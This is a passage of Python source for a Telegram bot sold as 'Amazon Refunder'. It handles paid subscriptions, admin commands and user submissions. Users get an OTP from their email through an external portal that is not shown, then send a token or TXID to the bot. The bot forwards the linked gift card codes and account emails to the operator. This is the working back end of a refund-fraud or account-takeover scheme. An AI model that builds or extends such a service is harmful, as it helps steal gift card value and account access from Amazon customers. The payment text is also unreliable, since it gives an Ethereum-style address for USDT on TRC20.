        return False

def delete_telegram_message(chat_id: str, message_id: int) -> bool:
    """Delete a Telegram message"""
    if not TELEGRAM_BOT_TOKEN:
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
    payload = {'chat_id': chat_id, 'message_id': message_id}
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Delete message error: {e}")
        return False

def edit_telegram_message(chat_id: str, message_id: int, text: str, 
                         reply_markup: Optional[Dict] = None, parse_mode: str = 'HTML') -> bool:
    """Edit a Telegram message"""
    if not TELEGRAM_BOT_TOKEN:
        return False
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': parse_mode
    }
    
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    
    try:
        response = requests.post(url, json=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        logger.error(f"Edit message error: {e}")
        return False

def get_chat_member(chat_id: str, user_id: str) -> Optional[Dict]:
    """Get chat member information"""
    if not TELEGRAM_BOT_TOKEN:
        return None
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getChatMember"
    payload = {'chat_id': chat_id, 'user_id': user_id}
    
    try:
        response = requests.get(url, params=payload, timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('ok'):
                return data.get('result')
        return None
    except Exception as e:
        logger.error(f"Get chat member error: {e}")
        return None

def is_user_in_channel(user_id: str, channel_id: str) -> bool:
    """Check if user is in a channel"""
    member = get_chat_member(channel_id, user_id)
    if member:
        status = member.get('status')
        return status in ['member', 'administrator', 'creator']
    return False

# ============================================================
# SUBSCRIPTION FUNCTIONS (100 lines)
# ============================================================

def get_subscription_plan(plan_id: str) -> Optional[Dict]:
    """Get subscription plan by ID"""
    return SUBSCRIPTION_PLANS.get(plan_id)

def get_all_subscription_plans() -> List[Dict]:
    """Get all subscription plans"""
    return list(SUBSCRIPTION_PLANS.values())

def create_subscription(user_id: str, plan_id: str, payment_id: str) -> Tuple[bool, str, Optional[Dict]]:
    """Create a subscription for a user"""
    plan = get_subscription_plan(plan_id)
    if not plan:
        return False, "Invalid plan", None
    
    expires_at = calculate_expiry(plan_id)
    
    subscription_data = {
        'user_id': user_id,
        'plan_id': plan_id,
        'plan_name': plan['name'],
        'price': plan['price'],
        'expires_at': expires_at.isoformat(),
        'payment_id': payment_id,
        'created_at': datetime.now().isoformat(),
        'status': 'active'
    }
    
    # Store subscription
    sub_id = generate_id("SUB")
    storage.subscriptions[sub_id] = subscription_data
    
    # Update user
    user = storage.get_user(user_id)
    if user:
        user.subscription_id = sub_id
        user.subscription_expiry = expires_at
    
    return True, "Subscription created successfully", subscription_data

def check_user_subscription(user_id: str) -> Tuple[bool, Optional[Dict]]:
    """Check if user has active subscription"""
    user = storage.get_user(user_id)
    if not user:
        return False, None
    
    if user.role == UserRole.ADMIN:
        return True, {'type': 'admin', 'expires': 'never'}
    
    if user.subscription_expiry and user.subscription_expiry > datetime.now():
        sub_data = storage.subscriptions.get(user.subscription_id)
        return True, sub_data
    
    return False, None

def get_subscription_remaining(user_id: str) -> Optional[timedelta]:
    """Get remaining time for user's subscription"""
    user = storage.get_user(user_id)
    if not user or not user.subscription_expiry:
        return None
    
    if user.role == UserRole.ADMIN:
        return timedelta(days=36500)  # Admin = lifetime
    
    remaining = user.subscription_expiry - datetime.now()
    return remaining if remaining.total_seconds() > 0 else None

def format_remaining_time(remaining: Optional[timedelta]) -> str:
    """Format remaining time for display"""
    if remaining is None:
        return "Expired"
    
    days = remaining.days
    hours = remaining.seconds // 3600
    minutes = (remaining.seconds % 3600) // 60
    
    if days > 0:
        return f"{days}d {hours}h {minutes}m"
    elif hours > 0:
        return f"{hours}h {minutes}m"
    else:
        return f"{minutes}m"

# ============================================================
# TELEGRAM BOT RESPONSE FUNCTIONS (300 lines)
# ============================================================

def send_welcome(chat_id: str, username: str) -> bool:
    """Send welcome message"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 OPEN REFUND PORTAL", "url": APP_URL}],
            [{"text": "💰 REFUND BALANCE", "callback_data": "open_portal"}, 
             {"text": "🎫 REFUND GIFT CARD", "callback_data": "open_portal"}],
            [{"text": "📦 VIEW PLANS", "callback_data": "view_plans"}, 
             {"text": "📊 CHECK STATUS", "callback_data": "check_status"}],
            [{"text": "❓ HELP", "callback_data": "help_menu"}],
            [{"text": "🔄 REFRESH", "callback_data": "back_to_main"}]
        ]
    }
    
    total_users = len(storage.users)
    total_refunds = sum(1 for t in storage.transactions.values() if t.status == TransactionStatus.COMPLETED)
    total_earnings = sum(t.amount for t in storage.transactions.values() if t.status == TransactionStatus.COMPLETED)
    
    text = f"""
🎯 <b>WELCOME TO AMAZON REFUNDER</b> 🎯

Hello <b>@{username}</b>! 

┌─────────────────────────────┐
│ ⚡ <b>Your Trusted Refund Service</b> │
└─────────────────────────────┘

<b>✨ Services Offered:</b>
• 💰 Refund Amazon Balance
• 🎁 Refund Unused Gift Cards  
• ⚡ Instant Processing (5-10 min)
• ✅ 99.9% Success Rate
• 🔒 256-bit SSL Encryption

<b>📌 Quick Start:</b>
1️⃣ Click "OPEN REFUND PORTAL"
2️⃣ Choose your refund method
3️⃣ Submit your details
4️⃣ Enter OTP from email
5️⃣ Send the generated code/token here

<b>📊 Platform Statistics:</b>
• 👥 Total Users: {total_users:,}
• 💰 Total Refunds: {total_refunds:,}
• 💵 Total Earned: ${total_earnings:,.2f}

<i>Need subscription? Send /plans</i>
    """
    
    return send_telegram_message(chat_id, text, keyboard)

def send_subscription_required(chat_id: str) -> bool:
    """Send subscription required message"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "⚡ 1 HOUR - $5", "callback_data": "buy_1hour"}],
            [{"text": "📦 10 DAYS - $25", "callback_data": "buy_10days"}],
            [{"text": "🔥 30 DAYS - $50", "callback_data": "buy_30days"}],
            [{"text": "👑 1 YEAR - $150", "callback_data": "buy_1year"}],
            [{"text": "💎 LIFETIME - $300", "callback_data": "buy_lifetime"}],
            [{"text": "❓ NEED HELP?", "callback_data": "help_menu"}]
        ]
    }
    
    text = """
⚠️ <b>SUBSCRIPTION REQUIRED</b> ⚠️

You need an active subscription to use this bot.

<b>📦 Available Plans:</b>
┌─────────────────────────────┐
│ ⚡ 1 Hour     - $5          │
│ 📦 10 Days    - $25         │
│ 🔥 30 Days    - $50         │
│ 👑 1 Year     - $150        │
│ 💎 Lifetime   - $300        │
└─────────────────────────────┘

<b>💳 Payment Methods:</b>
• USDT (TRC20)
• Bitcoin (BTC)  
• Ethereum (ETH)

<i>Click a plan below or type:</i>
<code>/buy 1hour</code>
    """
    
    return send_telegram_message(chat_id, text, keyboard)

def send_plans_menu(chat_id: str) -> bool:
    """Send subscription plans menu"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "⚡ 1 HOUR - $5", "callback_data": "buy_1hour"}],
            [{"text": "📦 10 DAYS - $25", "callback_data": "buy_10days"}],
            [{"text": "🔥 30 DAYS - $50", "callback_data": "buy_30days"}],
            [{"text": "👑 1 YEAR - $150", "callback_data": "buy_1year"}],
            [{"text": "💎 LIFETIME - $300", "callback_data": "buy_lifetime"}],
            [{"text": "🔙 BACK TO MAIN", "callback_data": "back_to_main"}]
        ]
    }
    
    plans_text = """
<b>📦 SUBSCRIPTION PLANS</b>

┌─────────────────────────────────────────────┐
│ <b>Plan</b>         │ <b>Price</b>    │ <b>Duration</b> │
├─────────────────────────────────────────────┤
│ ⚡ 1 Hour      │ $5        │ 1 Hour          │
│ 📦 10 Days     │ $25       │ 10 Days         │
│ 🔥 30 Days     │ $50       │ 30 Days         │
│ 👑 1 Year      │ $150      │ 365 Days        │
│ 💎 Lifetime    │ $300      │ Forever         │
└─────────────────────────────────────────────┘

<b>✨ Benefits:</b>
• ✅ Full access to all features
• 🚀 Priority processing
• 🎯 Higher success rate
• 💬 Priority support
• 🔒 SSL encrypted connection

<b>💳 Payment Methods:</b>
• USDT (TRC20): <code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>
• Bitcoin: <code>1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</code>
• Ethereum: <code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>

<b>📌 How to Purchase:</b>
1. Click a plan below OR type <code>/buy [plan]</code>
2. Send payment to the address above
3. Copy the Payment ID shown
4. Send <code>/verify [payment_id]</code>
    """
    
    return send_telegram_message(chat_id, plans_text, keyboard)

def send_status_message(chat_id: str, user_id: str) -> bool:
    """Send subscription status message"""
    has_sub, sub_data = check_user_subscription(user_id)
    
    if has_sub:
        user = storage.get_user(user_id)
        remaining = get_subscription_remaining(user_id)
        
        text = f"""
✅ <b>SUBSCRIPTION ACTIVE</b> ✅

<b>📦 Plan:</b> {sub_data.get('plan_name', 'Unknown') if sub_data else 'Admin'}
<b>📅 Expires:</b> {user.subscription_expiry.strftime('%Y-%m-%d %H:%M:%S') if user and user.subscription_expiry else 'Never'}
<b>⏰ Remaining:</b> {format_remaining_time(remaining)}
<b>📅 Granted:</b> {sub_data.get('created_at', 'Unknown')[:10] if sub_data else 'N/A'}

<b>📊 Usage:</b>
• Refunds Used: 0
• Total Refunds: Unlimited

<i>Enjoy using Amazon Refunder!</i>
        """
        return send_telegram_message(chat_id, text)
    else:
        keyboard = {"inline_keyboard": [[{"text": "📦 VIEW PLANS", "callback_data": "view_plans"}]]}
        text = """
❌ <b>NO ACTIVE SUBSCRIPTION</b> ❌

You need an active subscription to use this bot.

Click the button below to view plans.
        """
        return send_telegram_message(chat_id, text, keyboard)

def send_help_message(chat_id: str) -> bool:
    """Send help message"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📦 VIEW PLANS", "callback_data": "view_plans"}],
            [{"text": "🔙 BACK TO MAIN", "callback_data": "back_to_main"}]
        ]
    }
    
    text = """
❓ <b>HELP CENTER</b> ❓

<b>📌 Commands:</b>
/start - Restart the bot
/plans - View subscription plans
/buy [plan] - Purchase subscription
/status - Check subscription status
/help - Show this menu

<b>🎫 Refund Process:</b>
1. Open the refund portal
2. Submit your refund request
3. Check email for OTP
4. Enter OTP on the portal
5. Copy the generated code/token
6. Send it here in the chat
7. Wait 5-10 minutes for processing

<b>💳 Payment Process:</b>
1. Send /buy [plan]
2. Copy the payment details
3. Send payment to the address
4. Send /verify [payment_id]
5. Subscription activates instantly

<b>📞 Support:</b>
• Contact: @admin_username
• Response Time: 5-10 minutes
• Support Hours: 24/7

<b>⚠️ Important:</b>
• Keep your payment ID safe
• Never share your password
• Only use official portal
• OTP expires in 10 minutes
    """
    
    return send_telegram_message(chat_id, text, keyboard)

def send_admin_dashboard(chat_id: str) -> bool:
    """Send admin dashboard"""
    keyboard = {
        "inline_keyboard": [
            [{"text": "📊 VIEW STATS", "callback_data": "stats"}],
            [{"text": "📢 BROADCAST", "callback_data": "broadcast"}],
            [{"text": "🔙 BACK TO MAIN", "callback_data": "back_to_main"}]
        ]
    }
    
    total_users = len(storage.users)
    active_subs = len([s for s in storage.subscriptions.values() 
                       if datetime.fromisoformat(s['expires_at']) > datetime.now()])
    total_refunds = len(storage.transactions)
    total_earnings = sum(t.amount for t in storage.transactions.values() 
                         if t.status == TransactionStatus.COMPLETED)
    pending_payments = len(storage.pending_payments)
    pending_verifications = len(storage.pending_verifications)
    
    text = f"""
⚙️ <b>ADMIN DASHBOARD</b> ⚙️

<b>📊 Statistics:</b>
• 👥 Total Users: {total_users}
• ✅ Active Subs: {active_subs}
• 💰 Total Refunds: {total_refunds}
• 💵 Total Earnings: ${total_earnings:,.2f}
• ⏳ Pending Payments: {pending_payments}
• ⏳ Pending Verifications: {pending_verifications}

<b>📈 Quick Actions:</b>
• View detailed statistics
• Send broadcasts to users

<i>Select an option below</i>
    """
    
    return send_telegram_message(chat_id, text, keyboard)

def send_admin_stats(chat_id: str) -> bool:
    """Send detailed admin statistics"""
    total_users = len(storage.users)
    active_subs = len([s for s in storage.subscriptions.values() 
                       if datetime.fromisoformat(s['expires_at']) > datetime.now()])
    total_refunds = len(storage.transactions)
    total_earnings = sum(t.amount for t in storage.transactions.values() 
                         if t.status == TransactionStatus.COMPLETED)
    pending_payments = len(storage.pending_payments)
    pending_verifications = len(storage.pending_verifications)
    active_sessions = len(storage.sessions)
    total_codes = len(storage.redeem_codes)
    
    # Calculate subscription breakdown
    plan_counts = {}
    for sub in storage.subscriptions.values():
        plan_id = sub.get('plan_id', 'unknown')
        plan_counts[plan_id] = plan_counts.get(plan_id, 0) + 1
    
    plan_breakdown = "\n".join([f"• {plan}: {count}" for plan, count in plan_counts.items()]) or "No subscriptions yet"
    
    # User growth
    today = datetime.now().strftime('%Y-%m-%d')
    today_users = len([u for u in storage.users.values() 
                       if u.joined_at.strftime('%Y-%m-%d') == today])
    
    text = f"""
📊 <b>DETAILED STATISTICS</b> 📊

<b>👥 User Statistics:</b>
• Total Users: {total_users}
• Active Subscriptions: {active_subs}
• New Users Today: {today_users}
• Banned Users: {len(storage.banned_users)}

<b>💳 Transaction Statistics:</b>
• Total Refunds: {total_refunds}
• Total Earnings: ${total_earnings:,.2f}
• Pending Payments: {pending_payments}
• Pending Verifications: {pending_verifications}

<b>🔐 Session Statistics:</b>
• Active Sessions: {active_sessions}
• Total Gift Cards: {total_codes}
• Active OTPs: {len(storage.otps)}

<b>📦 Subscription Breakdown:</b>
{plan_breakdown}

<b>⚙️ System Status:</b>
• Bot Status: ✅ Online
• Maintenance: {'⚠️ Enabled' if storage.admin_settings.get('maintenance_mode', False) else '✅ Disabled'}
• Force Subscription: {'✅ Enabled' if storage.admin_settings.get('force_subscription', True) else '❌ Disabled'}

<i>Last updated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</i>
    """
    
    return send_telegram_message(chat_id, text)

# ============================================================
# TELEGRAM COMMAND HANDLERS (300 lines)
# ============================================================

def handle_buy_command(chat_id: str, user_id: str, plan: str) -> bool:
    """Handle /buy command"""
    if plan not in SUBSCRIPTION_PLANS:
        return send_telegram_message(chat_id, "❌ Invalid plan. Available: 1hour, 10days, 30days, 1year, lifetime")
    
    plan_info = SUBSCRIPTION_PLANS[plan]
    payment_id = generate_payment_id()
    
    # Store pending payment
    storage.pending_payments[payment_id] = {
        'user_id': user_id,
        'plan': plan,
        'plan_name': plan_info['name'],
        'price': plan_info['price'],
        'timestamp': datetime.now().isoformat(),
        'status': 'pending'
    }
    
    # Send to admin for verification
    admin_msg = f"""
💰 <b>NEW PAYMENT REQUEST</b> 💰

<b>📦 Plan:</b> {plan_info['name']}
<b>👤 User:</b> {user_id}
<b>💵 Amount:</b> ${plan_info['price']}
<b>🆔 Payment ID:</b> <code>{payment_id}</code>
<b>⏰ Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>✅ To verify payment:</b>
Send: <code>/verify {payment_id}</code>
    """
    send_to_admin(admin_msg)
    
    # Send to user
    text = f"""
💰 <b>Payment Required</b> 💰

<b>📦 Plan:</b> {plan_info['name']}
<b>💵 Amount:</b> ${plan_info['price']}
<b>🆔 Payment ID:</b> <code>{payment_id}</code>

<b>💳 Send payment to:</b>
<code>0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb5</code>

<b>✅ After sending payment:</b>
Send: <code>/verify {payment_id}</code>

<i>⚠️ Admin will verify your payment manually.</i>
<i>⏱️ You have 60 minutes to complete payment</i>
    """
    
    return send_telegram_message(chat_id, text)

def handle_verify_payment(chat_id: str, payment_id: str) -> bool:
    """Admin command to verify payment"""
    if payment_id not in storage.pending_payments:
        return send_telegram_message(chat_id, "❌ Invalid or expired payment ID")
    
    payment = storage.pending_payments[payment_id]
    user_id = payment['user_id']
    plan = payment['plan']
    plan_info = SUBSCRIPTION_PLANS[plan]
    
    # Calculate expiry
    expires_at = calculate_expiry(plan)
    
    # Create subscription
    success, message, sub_data = create_subscription(user_id, plan, payment_id)
    
    if not success:
        return send_telegram_message(chat_id, f"❌ {message}")
    
    # Update payment status
    storage.pending_payments[payment_id]['status'] = 'verified'
    
    # Send confirmation to admin
    send_telegram_message(chat_id, f"""
✅ <b>PAYMENT VERIFIED!</b>

<b>📦 Plan:</b> {plan_info['name']}
<b>👤 User:</b> {user_id}
<b>💵 Amount:</b> ${plan_info['price']}
<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

<i>Subscription activated successfully!</i>
    """)
    
    # Send confirmation to user
    send_telegram_message(user_id, f"""
✅ <b>SUBSCRIPTION ACTIVATED!</b> ✅

<b>📦 Plan:</b> {plan_info['name']}
<b>💰 Amount:</b> ${plan_info['price']}
<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

<b>🎉 Welcome to Amazon Refunder!</b>
Use /start to access all features.

<i>Thank you for subscribing!</i>
    """)
    
    # Log transaction
    transaction = storage.create_transaction(
        transaction_id=payment_id,
        user_id=user_id,
        transaction_type='subscription',
        amount=plan_info['price'],
        status=TransactionStatus.COMPLETED,
        description=f"Subscription: {plan_info['name']}"
    )
    storage.update_transaction(payment_id, completed_at=datetime.now())
    
    # Remove from pending
    del storage.pending_payments[payment_id]
    
    return True

def handle_give_subscription(chat_id: str, text: str) -> bool:
    """Admin command to give subscription"""
    parts = text.split()
    if len(parts) < 3:
        return send_telegram_message(chat_id, "❌ Usage: /give [user_id] [days]")
    
    try:
        target_user = parts[1]
        days = int(parts[2])
        
        if days <= 0:
            return send_telegram_message(chat_id, "❌ Days must be greater than 0")
        
        # Create subscription
        expires_at = datetime.now() + timedelta(days=days)
        sub_id = generate_id("SUB")
        
        storage.subscriptions[sub_id] = {
            'user_id': target_user,
            'plan_id': 'admin_granted',
            'plan_name': f'Admin Granted ({days} days)',
            'price': 0,
            'expires_at': expires_at.isoformat(),
            'payment_id': None,
            'created_at': datetime.now().isoformat(),
            'status': 'active'
        }
        
        # Update user
        user = storage.get_user(target_user)
        if user:
            user.subscription_id = sub_id
            user.subscription_expiry = expires_at
        
        # Send confirmation to admin
        send_telegram_message(chat_id, f"""
✅ <b>SUBSCRIPTION GRANTED</b>

<b>👤 User:</b> {target_user}
<b>📅 Duration:</b> {days} days
<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

<i>User can now access all features!</i>
        """)
        
        # Send notification to user
        send_telegram_message(target_user, f"""
🎉 <b>SUBSCRIPTION GRANTED!</b> 🎉

An admin has granted you a {days}-day subscription!

<b>📅 Expires:</b> {expires_at.strftime('%Y-%m-%d %H:%M:%S')}

Use /start to access all features.
        """)
        
        return True
        
    except ValueError:
        return send_telegram_message(chat_id, "❌ Invalid days format. Please enter a number.")
    except Exception as e:
        return send_telegram_message(chat_id, f"❌ Error: {str(e)}")

def handle_revoke_subscription(chat_id: str, text: str) -> bool:
    """Admin command to revoke subscription"""
    parts = text.split()
    if len(parts) < 2:
        return send_telegram_message(chat_id, "❌ Usage: /revoke [user_id]")
    
    target_user = parts[1]
    
    # Find and remove subscription
    user = storage.get_user(target_user)
    if user and user.subscription_id:
        if user.subscription_id in storage.subscriptions:
            del storage.subscriptions[user.subscription_id]
        user.subscription_id = None
        user.subscription_expiry = None
        send_telegram_message(chat_id, f"✅ Subscription revoked for user {target_user}")
        send_telegram_message(target_user, "⚠️ Your subscription has been revoked by admin.")
        return True
    else:
        return send_telegram_message(chat_id, f"❌ No subscription found for user {target_user}")

def handle_ban_user(chat_id: str, text: str) -> bool:
    """Ban a user"""
    parts = text.split()
    if len(parts) < 2:
        return send_telegram_message(chat_id, "❌ Usage: /ban [user_id]")
    
    target_user = parts[1]
    if target_user not in storage.banned_users:
        storage.banned_users.append(target_user)
        
        user = storage.get_user(target_user)
        if user:
            user.is_banned = True
            user.ban_date = datetime.now()
            user.ban_reason = "Banned by admin"
        
        send_telegram_message(chat_id, f"✅ User {target_user} has been banned.")
        send_telegram_message(target_user, "⚠️ You have been banned from using this bot.")
        return True
    else:
        return send_telegram_message(chat_id, f"⚠️ User {target_user} is already banned.")

def handle_unban_user(chat_id: str, text: str) -> bool:
    """Unban a user"""
    parts = text.split()
    if len(parts) < 2:
        return send_telegram_message(chat_id, "❌ Usage: /unban [user_id]")
    
    target_user = parts[1]
    if target_user in storage.banned_users:
        storage.banned_users.remove(target_user)
        
        user = storage.get_user(target_user)
        if user:
            user.is_banned = False
            user.ban_reason = ""
            user.ban_date = None
        
        send_telegram_message(chat_id, f"✅ User {target_user} has been unbanned.")
        send_telegram_message(target_user, "✅ You have been unbanned.")
        return True
    else:
        return send_telegram_message(chat_id, f"⚠️ User {target_user} is not banned.")

def broadcast_to_all(message: str) -> Tuple[int, int]:
    """Broadcast message to all users"""
    sent = 0
    failed = 0
    
    for user_id in storage.users.keys():
        try:
            if send_telegram_message(user_id, f"📢 <b>BROADCAST</b>\n\n{message}"):
                sent += 1
            else:
                failed += 1
            time.sleep(0.05)  # Rate limiting
        except Exception as e:
            failed += 1
            logger.error(f"Broadcast failed to {user_id}: {e}")
    
    send_to_admin(f"""
📢 <b>BROADCAST COMPLETE</b>

✅ Sent: {sent}
❌ Failed: {failed}
👥 Total Users: {len(storage.users)}
    """)
    
    return sent, failed

# ============================================================
# TELEGRAM UPDATE PROCESSORS (200 lines)
# ============================================================

def process_telegram_update(update: Dict[str, Any]) -> None:
    """Main entry point for processing Telegram updates"""
    try:
        if 'callback_query' in update:
            process_callback_query(update['callback_query'])
        elif 'message' in update:
            process_message(update['message'])
        elif 'inline_query' in update:
            process_inline_query(update['inline_query'])
        elif 'channel_post' in update:
            process_channel_post(update['channel_post'])
    except Exception as e:
        logger.error(f"Error processing update: {e}")
        send_to_admin(f"⚠️ Error: {str(e)}")

def process_callback_query(callback_query: Dict[str, Any]) -> None:
    """Process callback query (button presses)"""
    try:
        chat_id = callback_query['message']['chat']['id']
        user_id = str(callback_query['from']['id'])
        data = callback_query['data']
        message_id = callback_query['message']['message_id']
        
        # Answer callback
        answer_callback_query(callback_query['id'])
        
        is_admin = (user_id == TELEGRAM_ADMIN_CHAT_ID)
        
        # Handle different callback data
        if data == 'view_plans':
            send_plans_menu(chat_id)
        elif data == 'check_status':
            send_status_message(chat_id, user_id)
        elif data == 'help_menu':
            send_help_message(chat_id)
        elif data == 'open_portal':
            keyboard = {"inline_keyboard": [[{"text": "🌐 OPEN REFUND PORTAL", "url": APP_URL}]]}
            send_telegram_message(chat_id, "🔗 Click below to open the refund portal:", keyboard)
        elif data == 'dashboard':
            if is_admin:
                send_admin_dashboard(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized access.")
        elif data == 'stats':
            if is_admin:
                send_admin_stats(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif data == 'broadcast':
            if is_admin:
                storage.admin_settings['broadcast_mode'] = True
                send_telegram_message(chat_id, "📢 Send the message you want to broadcast:")
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif data.startswith('buy_'):
            plan = data.replace('buy_', '')
            handle_buy_command(chat_id, user_id, plan)
        elif data == 'back_to_main':
            send_welcome(chat_id, callback_query['from'].get('username', 'User'))
        elif data == 'close':
            delete_telegram_message(chat_id, message_id)
        else:
            send_telegram_message(chat_id, "❌ Unknown action.")
            
    except Exception as e:
        logger.error(f"Callback error: {e}")
        send_to_admin(f"⚠️ Callback error: {str(e)}")

def process_message(message: Dict[str, Any]) -> None:
    """Process incoming messages"""
    try:
        chat_id = message['chat']['id']
        user_id = str(message['from']['id'])
        username = message['from'].get('username', 'User')
        first_name = message['from'].get('first_name', '')
        last_name = message['from'].get('last_name', '')
        text = message.get('text', '').strip()
        
        is_admin = (user_id == TELEGRAM_ADMIN_CHAT_ID)
        
        # Check if user is banned
        if user_id in storage.banned_users:
            send_telegram_message(chat_id, "❌ You are banned from using this bot.")
            return
        
        # Check for maintenance mode
        if storage.admin_settings.get('maintenance_mode', False) and not is_admin:
            send_telegram_message(chat_id, "⚠️ Bot is currently under maintenance. Please try again later.")
            return
        
        # Register user
        user = storage.get_user(user_id)
        if not user:
            user = storage.create_user(
                user_id=user_id,
                username=username,
                first_name=first_name,
                last_name=last_name
            )
            send_to_admin(f"👤 New user: @{username} ({user_id})")
        else:
            user.last_active = datetime.now()
            if user.username != username:
                user.username = username
        
        # Broadcast mode (admin)
        if is_admin and storage.admin_settings.get('broadcast_mode', False):
            storage.admin_settings['broadcast_mode'] = False
            broadcast_to_all(text)
            send_telegram_message(chat_id, "✅ Broadcast sent to all users!")
            return
        
        # Check subscription
        if not is_admin and not check_user_subscription(user_id)[0] and text not in ['/start', '/plans', '/help'] and not text.startswith('/buy'):
            send_subscription_required(chat_id)
            return
        
        # Handle commands
        if text == '/start':
            send_welcome(chat_id, username)
        elif text == '/plans':
            send_plans_menu(chat_id)
        elif text == '/status':
            send_status_message(chat_id, user_id)
        elif text == '/help':
            send_help_message(chat_id)
        elif text == '/dashboard':
            if is_admin:
                send_admin_dashboard(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text == '/stats':
            if is_admin:
                send_admin_stats(chat_id)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text.startswith('/buy'):
            parts = text.split()
            if len(parts) > 1:
                handle_buy_command(chat_id, user_id, parts[1].lower())
            else:
                send_telegram_message(chat_id, "❌ Usage: /buy [plan]\nPlans: 1hour, 10days, 30days, 1year, lifetime")
        elif text.startswith('/verify'):
            if is_admin:
                parts = text.split()
                if len(parts) > 1:
                    handle_verify_payment(chat_id, parts[1])
                else:
                    send_telegram_message(chat_id, "❌ Usage: /verify [payment_id]")
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text.startswith('/give'):
            if is_admin:
                handle_give_subscription(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text.startswith('/revoke'):
            if is_admin:
                handle_revoke_subscription(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text.startswith('/broadcast'):
            if is_admin:
                storage.admin_settings['broadcast_mode'] = True
                send_telegram_message(chat_id, "📢 Send the message you want to broadcast:")
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text.startswith('/ban'):
            if is_admin:
                handle_ban_user(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text.startswith('/unban'):
            if is_admin:
                handle_unban_user(chat_id, text)
            else:
                send_telegram_message(chat_id, "❌ Unauthorized.")
        elif text.startswith('RDM-'):
            handle_token_submission(chat_id, user_id, text)
        elif text.startswith('AMZ'):
            handle_txid_submission(chat_id, user_id, text)
        elif text.startswith('/'):
            send_telegram_message(chat_id, "❌ Unknown command. Send /help for available commands.")
        else:
            if len(text) >= 10:
                send_telegram_message(chat_id, "❌ Invalid code format. Please generate a new one from the portal.")
            else:
                send_telegram_message(chat_id, "❌ I don't understand. Send /help for available commands.")
                
    except Exception as e:
        logger.error(f"Message error: {e}")
        send_to_admin(f"⚠️ Message error: {str(e)}")

def process_inline_query(inline_query: Dict[str, Any]) -> None:
    """Process inline queries"""
    # Inline queries are more advanced, skip for now
    pass

def process_channel_post(channel_post: Dict[str, Any]) -> None:
    """Process channel posts"""
    # Handle channel posts if needed
    pass

# ============================================================
# TOKEN HANDLERS (100 lines)
# ============================================================

def handle_token_submission(chat_id: str, user_id: str, token: str) -> bool:
    """Handle gift card token submission"""
    if token in storage.redeem_codes:
        code_info = storage.redeem_codes[token]
        
        storage.pending_verifications[token] = {
            'user_id': user_id,
            'type': 'giftcard',
            'code': code_info['code'],
            'status': 'pending',
            'timestamp': datetime.now().isoformat()
        }
        
        send_to_admin(f"""
🎫 <b>TOKEN SUBMITTED FOR REFUND</b> 🎫

🔖 Token: <code>{token}</code>
💳 Gift Code: <code>{code_info['code']}</code>
👤 User: {user_id}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """)
        
        return send_telegram_message(chat_id, f"""
✅ <b>TOKEN RECEIVED!</b> ✅

🔖 Token: <code>{token}</code>
🔄 Status: Processing
⏱️ Estimated Time: 5-10 minutes

<i>You'll be notified when your refund is complete!</i>
        """)
    else:
        return send_telegram_message(chat_id, "❌ Invalid or expired token. Please generate a new one from the portal.")

def handle_txid_submission(chat_id: str, user_id: str, txid: str) -> bool:
    """Handle TXID submission"""
    if txid in storage.sessions:
        session_info = storage.sessions[txid]
        
        storage.pending_verifications[txid] = {
            'user_id': user_id,
            'type': 'account',
            'email': session_info.get('email', 'Unknown'),
            'status': 'pending',
            'timestamp': datetime.now().isoformat()
        }
        
        send_to_admin(f"""
🔐 <b>TXID SUBMITTED</b> 🔐

📌 TXID: <code>{txid}</code>
📧 Email: {session_info.get('email', 'Unknown')}
👤 User: {user_id}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """)
        
        return send_telegram_message(chat_id, f"""
✅ <b>TXID RECEIVED!</b> ✅

📌 TXID: <code>{txid}</code>
🔄 Status: Processing
⏱️ Estimated Time: Up to 12 hours

<i>You'll be notified when your refund is complete!</i>
        """)
    else:
        return send_telegram_message(chat_id, "❌ Invalid or expired TXID. Please generate a new one from the portal.")

# ============================================================
# POLLING FUNCTION (50 lines)
# ============================================================

last_update_id = 0

def poll_updates() -> None:
    """Poll Telegram for updates (fallback if webhook fails)"""
    global last_update_id
    
    logger.info("🚀 Starting polling mode...")
    send_to_admin("✅ Bot started in polling mode!")
    
    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {
                'offset': last_update_id + 1,
                'timeout': 30,
                'allowed_updates': ['message', 'callback_query']
            }
            
